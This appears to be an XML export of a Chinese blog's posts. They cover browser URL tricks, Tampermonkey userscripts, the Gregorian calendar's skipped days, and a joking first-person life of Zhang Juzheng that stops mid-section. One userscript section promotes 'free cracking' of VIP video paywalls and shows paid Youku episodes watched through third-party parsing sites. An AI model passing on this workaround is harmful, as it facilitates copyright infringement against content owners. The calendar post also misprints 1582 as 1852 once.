域名加上wp变成https://pan.baiduwp.com/s/1xoqNBgaTb9bOCW5n9OGXPg输入提取码后 点击文件名跳转获取下载地址。 移动端知乎全回答在微信或者手机浏览器打开知乎问题，只能看到一条回答，如果要显示全部答案，需要下载APP，比如这个问题 https://www.zhihu.com/question/330840262 如果你不想下载APP怎么办？在域名里加上vvv就成了https://www.zhihuvvv.com/question/330840262 ,然后打开效果如下，打开APP变成了查看更多回答。 另外百度贴吧也支持，比如周杰伦贴吧的这个帖子https://tieba.baidu.com/p/6200675596?pn=0&amp; 加上vvv后变成 http://tieba.baiduvvv.com/p/6200675596?pn=0&amp; 网页快照如果某个网页打不开或者内容被删除了，常常要用搜索引擎的网页快照看到内容。但有些搜索引擎可能没有该网页的快照，而且在手机移动端也是没法看网页快照的。这个网站聚合查询各大搜索引擎的网页快照，在某个网址的域名前面加上his.sh/ ，即可显示该网址的在各大搜索引擎的网页快照，支持百度快照、搜狗快照、360 快照、bing 快照、Google快照，还不支持archive.is。 比如：https://www.zhihu.com/question/330840262 在域名前面加上his.sh/ ，变为 his.sh/https://www.zhihu.com/question/330840262看看这个知乎问题的搜狗快照（7月20日） 商品历史价格查询很多商家喜欢搞活动喜欢先提价然后降价，为了识别商家真假促销可以先查询下商品的历史价格。 在地址栏中的电商域名后加入字母asd即可查询当前商品历史价格，如正常浏览商品，假设商品原链接为：https://item.jd.com/3505714.html，在地址栏中域名后添加“asd”后回车，添加“asd”后的商品页面为：https://item.jdasd.com/3505714.html支持京东，天猫等大多数网站。类似的网站还有 ：购物党https://www.gwdang.com/trend惠惠助手http://zhushou.huihui.cn/history.html比比鲸http://www.bibijing.com/history优惠买http://www.yhmai.cn/history商品历史价格查询 万能工具wn类似上面的网站这么多记不住怎么办，这里有终极万能工具。 wn万能命令是一个在线工具效率平台，将各种高质量的在线工具按应用站点聚合起来，让你以方便快捷好记的方式寻找和使用各类在线工具。 浏览任意网页时，输入这个万能命令 wn.run/ 或点击一下固定的书签，就会展示出用于该网页的各种附加在线工具，比如 快速查看该网页历史存档(网页被删了找回)、下载该网页的视频音乐文件(默认无法下载或需要安装app登陆等)、快速网页翻译(默认手机端网页翻译会比较繁琐)、快速网页长截图、查看电商历史价格等，并且点击工具时一般会直达针对该网页的功能详情页。 例如： https://item.jd.com/5225346.html 在网址前面加上wn.run/ ，变为wn.run/https://item.jd.com/5225346.html 可以显示针对京东站点可用的在线工具。再来看看b站https://wn.run/https://www.bilibili.com/video/av55630677 比如上面说的商品历史价格查询，历史快照这里都可以看到，还有油猴脚本等。 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome 浏览器扩展神器油猴]]></title>
    <url>%2F2019%2F07%2F16%2FChrome-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%89%A9%E5%B1%95%E7%A5%9E%E5%99%A8%E6%B2%B9%E7%8C%B4%2F</url>
    <content type="text"><![CDATA[我平常工作最常用的浏览器就是 Chrome 了，Google 出品，值得信赖，用 Chrome 就不得不提浏览器扩展了，有了各种 Chrome 扩展，可以让你浏览器网页更方便，工作更高效。 Chrome 扩展可以在 Google 应用商店下载 https://chrome.google.com/webstore/category/extensions?hl=zh-CN 这里可以搜索安装你喜欢的各种扩展。 比如我装了很多扩展。 扩展这么多，其中的油猴Tampermonkey 是必须推荐的一个，它是扩展中的王者，最强大的浏览器扩展。 安装油猴扩展油猴是个Chrome扩展，网站 https://www.tampermonkey.net/ 可以直接在官网下载 https://chrome.google.com/webstore/detail/tampermonkey/dhdgffkkebhmkfjojejmpbldmpobfkfo?hl=zh-CN 直接安装即可。 如果上不了Google，可以在国内第三方Chrome 插件网站 https://www.crx4chrome.com/http://chromecj.com/http://www.cnplugins.com/https://www.chromefor.com/等搜索下载。下载的是个 crx 文件，然后打开 Chrome 扩展chrome://extensions/，打开开发者模式，将下载的crx文件拖进去，如果出错提示程序包无效。将 crx 后缀改为 zip 再拖进去就能安装成功了，浏览器右上角可以看到图标。 脚本网站有了油猴扩展，还需要配上脚本。安装完扩展后点击图标，选择 获取新脚本会进入网站https://www.tampermonkey.net/scripts.php这里可以获取脚本来源，有3个来源网站 http://userscripts-mirror.org/ https://openuserjs.org/https://greasyfork.org/这里推荐 greasyfork ，因为它支持中文。 打开网站首页https://greasyfork.org/zh-CN 可以看到很多脚本。 安装脚本也很简单，找到需要的脚本，进入页面，点击安装，然后管理面板即可看到已安装的脚本。 下面推荐些实用的脚本，开始打开新世界的大门。 搜索去广告功能介绍：去掉百度、搜狗、谷歌搜索结果的重定向，回归为网站的原始网址—附带有去除百度的广告 包括百度顶部和底部的垃圾广告，脚本地址https://greasyfork.org/zh-CN/scripts/14178 安装脚本前搜索 浏览器 前面3个是广告 安装脚本后的效果，广告没有了，你还可以自定义设置。 知乎网页助手功能介绍：1、知乎站外链接直接跳转至目标网址；2、自动展开问题全部信息，同时展示所有回答；3、去除知乎网页中的广告；4、知乎网页中短视频下载；5、解除知乎复制限制-划词复制（鼠标左键划词自动添加到剪切板） 脚本地址 https://greasyfork.org/zh-CN/scripts/384172 比如这个周杰伦的视频回答 https://www.zhihu.com/question/35123246/answer/585795363安装脚本前安装后视频可以直接下载了。 微博浮图功能介绍：微博浮图控件，鼠标移过小图弹出浮动大图的脚本。脚本地址https://greasyfork.org/zh-CN/scripts/4233安装脚本前需要点击小图才能看到大图安装后效果，不用点击鼠标移上去即可看到大图，其实不限制微博，其他网站的图片一样可以。 百度网盘直链下载助手功能介绍：免客户端一键获取百度网盘文件真实下载地址，支持使用IDM，迅雷等下载工具下载。安装后会在对应界面出现【下载助手】按钮, 配合多线程下载工具达到提速的效果。脚本地址 https://greasyfork.org/zh-CN/scripts/39504 安装后不用安装网盘客户端就可以直接下载文件。 全网VIP视频免费破解功能介绍：懒人专用，全网VIP视频免费破解去广告、全网音乐直接下载、百度网盘直接下载、知乎视频下载等多合一版。脚本地址https://greasyfork.org/zh-CN/scripts/370634 打开优酷看《 长安十二时辰》，16集开始需要VIPhttps://v.youku.com/v_show/id_XNDI2NTAzNzQzNg==.html 安装脚本后，点击左侧的VIP可以跳转到VIP解析网站观看。 如果看不了，换接口解析。 豆瓣资源下载大师功能介绍：聚合数百家资源网站，通过右侧边栏1秒告诉你哪些网站能下载豆瓣页面上的电影|电视剧|纪录片|综艺|动画|音乐|图书等，有资源的网站显示绿色，没资源的网站显示黄色，就这么直观。 脚本地址 https://greasyfork.org/zh-CN/scripts/329484 看看最近上映的电影《蜘蛛侠：英雄远征》 https://movie.douban.com/subject/26931786/?from=showing右侧可以看到 中文影视字幕和影视精准匹配，可以到对应网站查看。 更多其他脚本自己搜索吧，有什么问题可以评论交流。 最后推荐一些其他扩展： Chrome插件英雄榜, 为优秀的Chrome插件写一本中文说明书 https://github.com/zhaoolee/ChromeAppHeroes/Chrome浏览器值得推荐的插件（扩展程序）一览 https://fengooge.blogspot.com/2018/12/recommend-plugins-of-Chrome.html https://jsproxy.gq/那些离不开的 Chrome 扩展插件https://michael728.github.io/2015/11/26/tools-chrome-extentions/2019年度最喜欢油猴脚本https://www.runningcheese.com/userscripts浏览器扩展 https://www.yuque.com/moapp/help/extensions45款Chrome插件http://ybmfx.com/archives/1901 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[历史上消失的10天去哪了？]]></title>
    <url>%2F2019%2F07%2F16%2F%E5%8E%86%E5%8F%B2%E4%B8%8A%E6%B6%88%E5%A4%B1%E7%9A%8410%E5%A4%A9%E5%8E%BB%E5%93%AA%E4%BA%86%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[如果你查过万年历，会发现1582年居然少了10天！http://wannianli.fkcha.com/year_1582_month_10.html Linux上有个cal命令可以查日历，如果你查过1752年，可能会奇怪，为什么9月2号后面是14号，却是丢失了11天！ 12345678910111213141516171819202122232425262728293031323334353637[root@root ~]# cal 1752 1752 January February MarchSu Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 1 1 2 3 4 5 6 7 5 6 7 8 9 10 11 2 3 4 5 6 7 8 8 9 10 11 12 13 1412 13 14 15 16 17 18 9 10 11 12 13 14 15 15 16 17 18 19 20 2119 20 21 22 23 24 25 16 17 18 19 20 21 22 22 23 24 25 26 27 2826 27 28 29 30 31 23 24 25 26 27 28 29 29 30 31 April May JuneSu Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 1 2 1 2 3 4 5 6 5 6 7 8 9 10 11 3 4 5 6 7 8 9 7 8 9 10 11 12 1312 13 14 15 16 17 18 10 11 12 13 14 15 16 14 15 16 17 18 19 2019 20 21 22 23 24 25 17 18 19 20 21 22 23 21 22 23 24 25 26 2726 27 28 29 30 24 25 26 27 28 29 30 28 29 30 31 July August SeptemberSu Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 1 1 2 14 15 16 5 6 7 8 9 10 11 2 3 4 5 6 7 8 17 18 19 20 21 22 2312 13 14 15 16 17 18 9 10 11 12 13 14 15 24 25 26 27 28 29 3019 20 21 22 23 24 25 16 17 18 19 20 21 2226 27 28 29 30 31 23 24 25 26 27 28 29 30 31 October November DecemberSu Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 1 2 3 4 1 2 8 9 10 11 12 13 14 5 6 7 8 9 10 11 3 4 5 6 7 8 915 16 17 18 19 20 21 12 13 14 15 16 17 18 10 11 12 13 14 15 1622 23 24 25 26 27 28 19 20 21 22 23 24 25 17 18 19 20 21 22 2329 30 31 26 27 28 29 30 24 25 26 27 28 29 30 31 原来是 1582 年格里历法将 10 月 5 日到 10 月 14 日直接抹掉了 ，见维基百科 https://zh.wikipedia.org/zh-cn/%E6%A0%BC%E9%87%8C%E6%9B%86 格里历（拉丁语：Calendarium Gregorianum，又译国瑞历、额我略历、格列高利历、格里高利历、葛瑞格里历、格列高历，也称基督历 ），是由意大利医生兼哲学家阿洛伊修斯·里利乌斯改革儒略历制定的历法，由罗马大公教会教宗额我略十三世在1582年颁行。公历是阳历的一种，于1912年在中国引进采用，因农历等中国传统历法是阴阳历，故公历在中文中又称阳历、西历、新历、公历。格里历与儒略历一样，格里历也是每四年在2月底置一闰日，但格里历特别规定，除非能被400整除，所有的世纪年（能被100整除）都不设闰日；如此，每四百年，格里历仅有97个闰年，比儒略历减少3个闰年 。 格里历的历年平均长度为365.2425日，接近平均回归年的365.242199074日，即每3300年误差一日，也更接近春分点回归年的365.24237日，即每8000年误差一日；而儒略历的历年为365.25日，每128年就误差一日 。到1582年时，儒略历的春分日（3月21日）与地球公转到春分点的实际时间已相差10天。因此，格里历开始实行时，将儒略历1582年10月4日星期四的次日，为格里历1582年10月15日星期五，即有10天被删除，但原星期的周期保持不变。格里历的纪年沿用儒略历，当年定历以耶稣诞生年开始起算（但考证是公元前4年出生，但此记数法沿用至今），称为“公元”。 1582,好熟悉的年份，如果你看过《万历十五年》应该知道，这一年是万历十年，一代名臣张居正过世，推行10年的一条鞭法也宣告结束，好不容易出现的大明中兴苗头就这样又被压下去，万历三十年不上朝，从此大明开始走下坡路，直到1644甲申国难，崇祯自缢煤山，最后一个汉人王朝大明结束了，所以才有“明实亡于万历”这一说法。 但如果你在Linux上查看1582的日历，发现并没有丢失那10天?1234567891011121314151617181920212223242526272829303132333435[root@root ~]# cal 1582 1582 January February MarchSu Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 1 2 3 1 2 3 7 8 9 10 11 12 13 4 5 6 7 8 9 10 4 5 6 7 8 9 1014 15 16 17 18 19 20 11 12 13 14 15 16 17 11 12 13 14 15 16 1721 22 23 24 25 26 27 18 19 20 21 22 23 24 18 19 20 21 22 23 2428 29 30 31 25 26 27 28 25 26 27 28 29 30 31 April May JuneSu Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 1 2 3 4 5 1 2 8 9 10 11 12 13 14 6 7 8 9 10 11 12 3 4 5 6 7 8 915 16 17 18 19 20 21 13 14 15 16 17 18 19 10 11 12 13 14 15 1622 23 24 25 26 27 28 20 21 22 23 24 25 26 17 18 19 20 21 22 2329 30 27 28 29 30 31 24 25 26 27 28 29 30 July August SeptemberSu Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 7 1 2 3 4 1 8 9 10 11 12 13 14 5 6 7 8 9 10 11 2 3 4 5 6 7 815 16 17 18 19 20 21 12 13 14 15 16 17 18 9 10 11 12 13 14 1522 23 24 25 26 27 28 19 20 21 22 23 24 25 16 17 18 19 20 21 2229 30 31 26 27 28 29 30 31 23 24 25 26 27 28 29 30 October November DecemberSu Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa Su Mo Tu We Th Fr Sa 1 2 3 4 5 6 1 2 3 1 7 8 9 10 11 12 13 4 5 6 7 8 9 10 2 3 4 5 6 7 814 15 16 17 18 19 20 11 12 13 14 15 16 17 9 10 11 12 13 14 1521 22 23 24 25 26 27 18 19 20 21 22 23 24 16 17 18 19 20 21 2228 29 30 31 25 26 27 28 29 30 23 24 25 26 27 28 29 30 31 维基百科是这样解释的： 由于新历法是教皇颁布的，新教国家予以抵制。直到18世纪，大英帝国，包括英格兰、苏格兰、以及现在美国的一部分才采纳格里历，也就是儒略历 1752年 9月2日星期三的次日是格里历1752年9月14日星期四，日期跳过11日。 值得注意的是，1582年，罗马教廷减去的是10天，而到1752年修改历法的时候却减去了11天的原因其实很简单，这涉及到了闰年的问题，闰年的计算方法：公元纪年的年数可以被四整除，即为闰年；被100整除而不能被400整除为平年；被100整除也可被400整除的为闰年。而1600年和1700年的2月都是29天，原来在1800年之前的闰年计算方法中没有把被100整除而不能被400整除的年份算为平年，更没有考虑到被100整除也可被400整除的算为闰年。所以罗马教廷把1700年的2月算成29天，而1600年的2月却是阴差阳错地恰好与现行的历法相符。结果1582年到1752年之间，当时历法算法和现行历法算法实际只相差了1天。 1582年2月，罗马教廷要求从1582 年10月中减去10天，因此1852 年10月4日后面紧跟着就是15日。 在意大利、西班牙等国家都这样处理了。其他天主教国家也很快跟着这么做了，但是新教国家不愿意修改，直到1752年，英国人才想通，理性终于占了上风，不过从1582年到那时，历法又多出了1天，所以英国议会在1752年作出决定，抹掉11天—-1752年9月3日至13日，至此才接受了格里历的改革。所以这个改革在英国及其殖民地（包括美国）在1752年9月才被执行。这样 1752 年9月2日后面跟着的就是1752 年9月14日， 这就是为什么cal 1752会丢失11天的原因。 为什么减去10天的原因是由于地球章动的常年累月的影响累计，历法已经不准了。虽然是罗马教皇宣布的，但是其实是天文学家们计算得出来的。https://tonydeng.github.io/2006/03/28/A-Linux-command-a-human-civilization/ 推荐阅读： 那些你可能不知道的浏览器奇技淫巧 那些你可能不知道的微信奇技淫巧 那些你可能不知道的微博奇技淫巧 那些你可能不知道的网易云音乐奇技淫巧 那些你可能不知道的搜索奇技淫巧 那些你可能不知道的视频下载奇技淫巧 那些你可能不知道的免费观看 VIP 视频奇技淫巧 那些你可能不知道的知乎奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何评价张居正]]></title>
    <url>%2F2019%2F07%2F16%2F%E5%A6%82%E4%BD%95%E8%AF%84%E4%BB%B7%E5%BC%A0%E5%B1%85%E6%AD%A3%2F</url>
    <content type="text"><![CDATA[本文来自知乎答主回答，地址 https://www.zhihu.com/question/20255485/answer/110608407 栋梁 1、荆州小秀才 我叫张居正，朋友们叫我叔大，同事们叫我太岳，太爷爷叫我圭儿。学生叫我张先生，有人叫我死鬼！你猜她是谁？ 大人物的降生，总是不平凡的。当然我也是。 我不是哪吒，妈妈没有怀孕三年，可是母上大人她幸苦了一年才将我生下。 爷爷说，生我时，他梦见遍地大水，流满屋子，惊恐地不得了，厉害得很！ 我说，发大水有何厉害的？他笑着说，你知道那水来自哪里？那可是从张少保的地里流出来的水。 谁是张少保？ 一个姓张的少保呀！ 太爷爷说，那晚我也做了一个梦：月亮落入咱家的院中的大水缸里，满缸发光。我近前一看，你猜怎么着？一只白龟浮现水中央。 是这样呀，那太爷爷您就给我起名叫白圭吗？ 嗯嗯！太爷爷捋着胡须，好像好有成就感的样子。 您好随便啊！ 我家祖祖辈辈没出过一个举人，可是到我这儿，这个魔咒要被打破了。 据说，我两岁的时候就认识《孟子》里的“王曰”二字。五岁的时候，我入学读书，十岁通六经大义。人称“荆州小神童”。 嘉靖十五年，我十二岁，前去荆州府投考，补府学生。知府李士翱拉着我的手，言道，你这孩子我曾见过的。昨天，我做了一个梦。我这人平时不做梦的。突然来了个梦，那这个肯定准。我梦到一个老神仙，他给了我一个玉印，吩咐我转给一个孩子。今天我一看，这个孩子就是你啊。不过，白圭这名字不太好，你往后叫张居正吧。 好吧，我明白了，知府大人在和我这个小秀才套近乎呢。作为答谢，我给您唱首歌，左手，右手， 一个慢动作；右手，左手，慢动作重播。这首歌，给你快乐，你有没有爱上我。 童年是幸福的，但是儿时，总会有个讨人嫌的小伙伴。我也不例外，那个辽王富七代朱宪㸅。总欺负我耶。也许，就是因为我是他妈妈眼中别人家的孩子吧。小样儿的，嫉妒我。 第二年，我去武昌考试，这次要考上，我就是举人啦。荆州张举人，想想也不错嘛。可是，有人从中作梗，我没考上呀。那个人就是湖广巡抚顾麟。他认为我太年轻，应该多经历些事情。 我勒个去，难道您不知道张爱玲吗？她说，出名要趁早。 也许，是他后悔了，愧疚了，请我吃饭，还唤出他儿子，拜见我，“此乃荆州张秀才，他年当枢要，汝可往见之，必念其为故人子也。”好吧，你是我哥们，你儿子是我侄儿，他年我发达了，会照顾我侄儿的。可是那年我刚十三岁，这样合适吗？ 嘉靖十六年，我又去乡试，这次没人捣乱，果然中试。十六岁的小举人，也不错。顾麟此时正好在安陆，听说我考中了，让我过去叙叙旧。我知道，叙旧是假，其实，你们都懂。他呀，就是不好意思，开这个口，请我吃饭就明说嘛。 唉，老毛病还是没改啊，一见我就解腰带（上次送了一条）。那么人看着呢，“古人都说大器晚成，这是说那些中材的，当然你不是中材，上次是我不好，耽误你了，我错了。这条犀带送给你。” 妈的，有人心胸狭隘，看不得半点别人的好。朱宪㸅那小子看我中了举人，怀恨在心，赐我爷爷喝酒。爷爷看到孙儿中举，辽王又赐酒，高兴，开怀畅饮。可是他小子一杯接一杯，不让爷爷停，一直逼他喝。爷爷，竟然……竟然醉死了…… 第二年，会试。这年我十七岁，家里看我太小，第一次出远门，还是不要去了。嗯，反正，我还想再玩两年，那么早就工作，太烦。 嘉靖二十三年，我入京会试，没中。我不伤心，这没有什么，结果一点也不意外。中二的年纪，谁肯循规蹈矩。我要写出那种有古韵，又合乎当世的奇文，赛过屈宋班司马等人。可是三年里，新功未成，旧业已芜。 那就这样吧，过了中二年纪，循规蹈矩就循规蹈矩吧。嘉靖二十六年，我入京考试，中二甲进士，选庶吉士。 庶吉士，我可是储相。 2、蜗牛 翰林院的生活很悠闲，大部分时间在寻章摘句，研究歌词歌赋。有时，也侃侃大山，讨论一下国家大事，什么东南倭寇，什么西北复套啊。 最近大家不讨论了，皇上不喜欢呗。听说夏言和曾铣因为复套问题，被砍了头。没有金刚钻，就别揽那个瓷器活。 偶尔，严阁老来翰林院坐坐。大家一窝蜂似的围了上去，个个谄媚至极，捶腿的捶腿，揉肩的头肩。一帮小人，趋炎附势。 “都让开，严阁老，您看看，这是我给您写的《代谢赐御制答辅臣贺雪吟疏》，请您过目。”好不容挤过人群，来到严阁老面前，终于能表现一下啦。严阁老，您一定要看啊，我的文笔好得很，包您满意。 初夏是个多雨的时节，淅淅的雨声在窗外打个不住，一只蜗牛在蜷缩在窗台，小心地，探出触角。（张居正像蜗牛一样，正在或左或右地伸出触角，寻觅政治上的支援。） 转眼三年过去了。政治上，我也有了些小看法。精心准备了好久，我写了一篇《论时政疏》送了上去：“其大者曰宗室骄恣，曰庶官疾旷，曰吏治因循，曰边备未修，曰财用大亏，其他为圣明之累者，不可以悉举，而五者乃其尤大较著者也。” 我认为我的奏疏一上，立即会引起皇上和严阁老的重视，到时候，他们会发现我这个天才少年，从此我便会飞黄腾达，迎娶白富美，拜相入阁，走上人生巅峰。我表示，我想多了，这篇奏章如石沉大海，没有激起半点涟漪。 遥想汉文帝时期，一个二十余岁的洛阳少年。他的《治安策》论众建诸侯以遏乱萌，这是汉朝的时局的对策。 宗室骄恣，现在，谁信啊。武宗时，确有诸侯造反两次。但就像宁王朱宸濠那样的声势，才折腾了不到四十天，就被阳明先生给平定了。 如今，皇上信奉道教，徽王信奉道教，皇上封他太清辅元宣化真人，辽王信奉道教，皇上封他清微忠教真人。这不过是讨皇上欢喜的一种可怜相，还有什么远大的志趣呢。骄恣，骄恣个屁。 好吧，我加上这条，不过想趁机捅辽王一刀，但是除了宗室骄恣，另外四条不是很好吗？ 蜗牛的触角伸出来了，它感觉外面的世界，不太好，很快地缩了回去（这个镜头要特写）。 我一个小破翰林，瞎操什么心，国家大事有大佬们呢，我还是安心写文章吧。 嘉靖二十九年，俺答寇大同，入蓟州，攻北古口，同时从黄榆沟溃墙入境，很快兵临城下。城是北京城，堂堂明帝国的首都，被一群野蛮人包围了。 朝廷居然无作为，任由这群野蛮人在城下抢劫一遭，然后大摇大摆的走了。事后问责，严阁老居然安然无恙，兵部尚书丁汝夔弃市，他活该，谁让他一兵不发。有人会说，不是严阁老让丁汝夔不要轻易开战的吗？是严阁老说的，那又怎么样？他是兵部尚书，还是你丁汝夔是兵部尚书？同样的是兵部尚书，你有什么脸去见于大人？ 蜗牛的一个触角及时收回，另一个却探了出去（也给镜头吧。这只小破蜗牛抢镜好几次了。严嵩那边碰壁，张居正开始倒向了徐阶）。 朝廷中的徐阁老，人还错。当俺答兵临城下的时候，他指出俺答的“求贡书”，是用汉文写的，应该再用鞑靼文再一份，免得到时候，他们不认账。当然什么文字不重要，这只是一个缓兵之计，我们需要时间，要等四方的勤王之师。 军队来了，结果你们也知道，我方死了不少人，却没有开战。 Why？ 这个国家，药丸！ 兵备如此松弛，让一群野蛮人兵临首都。 经济如此落后，后勤得不到一点保障，勤王之师来到帝国首都，居然没有饭吃。将士们一腔热血，不远万里，保家卫国。可是居然没有饭吃，如此能不寒了将士们的心，将来又谁肯为这个国家卖命？ 朝政依旧，严阁老忙着捞钱，徐阁老一心一意研究青词。呵呵，徐阁老，您和严阁老一样，一点作为都没有，一个尸位素餐，一个故位希宠罢了。 “种松勿负垣，植兰勿当逵，临市叹黄犬，但为后世嗤”，没有什么好留恋的，我还是走吧，江陵的山水在向我招手。 3、纵情山水 厌倦了也好，逃避也罢。嘉靖三十三年，我请假回江陵。筑室小湖山中，读书写诗，种瓜种豆，再养上一直大白鹤。陶渊明、林逋也不过如此吧。 日子闷了，去游览一下衡山，登高赋诗。 “初闻铁骑近神州，杀气谣传蓟北秋。” 呸！玩就好好玩，还想着国家大事。 张居正，张居正啊，你能不能愉快地玩耍。 玩都不能痛快，还要应付那个大傻子。辽王你说你喝酒，追女人每天的行程满满当当的，还要缠着我，作对吟诗。这些酸秀才才爱的活计，你掺和什么？难道还要考秀才？你不如继续发挥特长，做你这个光辉有前途的富七代。 哼，我都给你记下了：擅自外出藩地，用私生子冒充嫡子。 “欲骋万里途,中道安可留?各勉日新志,毋贻白首羞!” 江陵的山水看厌了，我发现我还是怀念北京。也许我只热爱政权，根本无心山水。 “国士死让,饭漂思韩,欲报君恩,岂恤人言!” 爱咋咋地，不管了，我要去北京。 4、嘉靖的尾巴 嘉靖三十六年，秋，我从江陵赶来。政局依旧，严阁老大权在握，徐阁老还是精心研究青词。表面平静，其实暗流涌动，这是暴风雨来临前的最后时刻。 隐忍，隐忍，再隐忍。暴风雨来得好象晚些，怎么还不见风？ 嘉靖四十一年，暴风雨终于来了，它把这积攒了几年的雨量一次倾下，猛烈壮观。严阁老老了，年迈的身子骨，经不起这场风暴，倒下了。 徐阁老成了内阁新的掌门人。 “狂歌袅袅天风发,未论当年赤壁舟。佳辰已是中秋近,万里清光自远天。” 解放区的天是明朗的天, 解放区得人民好喜欢。 我的好日子来了。 嘉靖四十五年，皇上驾崩。徐阁老找我来商量草拟遗诏。 我没听过错吧，找我来商量遗诏。 遗诏是圣旨啊，皇上一辈子，四十五年，最后的圣旨啊，最后一次，它可以肯定四十五年功绩，可以否定四十五年的一切。盖棺定论呀，大行皇帝，您聪明了一辈子，紧紧把握着政权，想不到最后的最后，落我们手里了。 5、火箭 两个月后，我升任礼部右侍郎兼翰林院学士，随后，我在十四天内入阁，领吏部左侍郎，接着我被任命《世宗实录》编修。当月又负责重录《永乐大典》，马上我被任命为礼部尚书兼武英殿大学士。隆庆元年，我又被授予更高的荣耀：少保兼太子太保。 “姓张的少保，张少保家的水。” 我想起爷爷。（回忆儿时和爷爷温馨的画面） 坐火箭，除了坐火箭，没法形容我的升官速度了。仅一年左右的时间，我从正五品升到了从一品。 6、内阁大乱斗 严阁老倒台了，永陵躺下了。穆宗皇上是一位宽厚的君主，好吧，他爱女人，爱喝酒，爱跟内监们一起玩耍，就是不爱这政治。 群龙无首，这下内阁可热闹了。 我先介绍一下现在内阁的成员：徐阁老、李春芳、郭朴、高拱、陈以勤老师、我。 其实我不想讲这个的，一是要想讲明白篇幅太长；二是这些内斗也没有促进生产力的发展,三是，我戏太少。那我偷个懒，就不细讲了。 总之，因为言官的努力，高拱致仕了，郭朴也没有顶住压力，走了，最后徐阁老也走了。 李春芳成了内阁首辅，他只是一个好好先生，谈不上什么作为，老师陈以勤也是。他们当个太平宰相足以，在动乱中，只能抓瞎。 国家的重任压在我一个人肩上了。张居正，你要努力！ 隆庆二年八月，我上《陈六事疏》：（一）省议论；（二）振纪纲；（三）重诏令；（四）核名实；（五）固邦本；（六）饬武备。 你们也看到了，有什么远大的政见吗？ 没有，这些都是平凡的意见，没有高超的理论。我不是政论家，我是一个现实的人，这一切的主张，都是针对当时的需要。 二十年前，我的《论时政疏》与现在的《陈六事疏》当然有一贯的地方，但是二十年的经验，还有二十年的政治生活，我的主张发生了不可磨灭的变化。我的议论已经摆脱了少年文人习气，一切扼中要点，我所陈述的六件事情，其实分为两项：第一论政本；第二论急务。 一条到四条是论政本，我希望皇上有主张，有决断，一切的诏令要实现，一切的政策要落实，一切的言论要控制。说白了要独裁，独裁政治才能集中力量办大事。 我希望皇上您要像秦始皇，像汉武帝，像太祖皇帝。如果您做不到，我可以伊尹，霍……或者赵普，如果把时间拉近些，我希望您让我做于谦。 “览卿奏，俱深切时务，具见谋国忠恳，该部、院看议行。”套话，空话，皇上对政治一点都不感冒。“嗯，你的奏章我看了，好，很好，你是个忠臣，让六部和都察院看着办吧。” 好了，政本先放下，急务不能等啊。 边关吃紧。 我朝的制度，完全是战时体制，国家的首都，政治中心，放在了第一道线上，只有敌人突破长城，就能兵临城下。 长城至关重要，我朝在长城以内设有九镇：辽东、蓟州、宣府、大同、榆林、宁夏、甘肃、太原、固原。河套一带敌人比较薄弱，西边四镇还算安定，太原在内长城以内，也还行。吃紧的是辽东、蓟州、宣府、大同四镇。 嘉靖二十九年，设总督蓟辽、保定等处军务一员，设总督宣大、山西等处军务一员，简称蓟辽总督，宣大总督。这是北京的左右两翼，拱卫着国家的中心。 辽东距离鞑靼的中心比较远，宣府、大同有山可守，蓟州是最危险的地方，重中之重啊。 我一定要慎重考虑蓟州的人选。有人建议谭纶、俞大猷、戚继光。嗯，这三人不错，经过战争的洗礼。 谭纶本是总督两广军务，我立即召回为兵部左侍郎兼右佥都御史，总督蓟辽、保定军务。大猷老了，还是不要动了，戚继光召为神机营副将，总理蓟州、昌平、保定兵事，总兵官以下，悉受节制。总理，戚继光是总理，有人肯定会很奇怪，我朝武将最高官职不过总兵，戚继光一个武将居然能上总理？ 咋滴?我就是偏袒戚帅，我乐意。你要本事，蓟州你去啊。 我这里我顺便提一见小事，哈哈…… 我没有笑，我是严肃的，堂堂大学士怎么会不稳重呢。 那个富七代，对，没错，就是辽王，那个大傻子。生活不检点，有人弹劾他。皇上派刑部侍郎洪朝选去调查此事。 话说，那个傻子不是信奉道教吗？他的道教神仙会保佑他逢凶化吉的，就算没有，不是还有皇上派的洪朝选吗？可是这傻子等不及了，也许想起了那出《窦娥冤血洒幡竿》的杂剧。 他也竖起了一面白旗，上书“讼冤之纛”四个大字。 按察副使笃臣正在江陵，认为辽王揭竿起义，造反了，立即派了五百兵士包围了辽王府。笃臣好样的，他比阳明先生厉害，不论时间上还是耗费上，就迅速地平定了藩王的叛乱。我给他100分。 6.5内阁大乱斗(下) 